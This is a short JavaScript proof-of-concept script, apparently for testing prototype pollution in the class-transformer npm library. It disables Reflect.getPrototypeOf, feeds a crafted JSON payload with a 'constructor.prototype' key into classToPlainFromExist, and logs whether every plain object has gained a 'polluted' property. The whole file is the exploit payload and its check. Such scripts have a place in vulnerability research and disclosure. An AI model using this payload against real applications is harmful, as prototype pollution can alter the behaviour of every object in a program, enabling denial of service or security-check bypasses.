Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
root.classToPlainFromExist(payload, {});
console.log({}.polluted);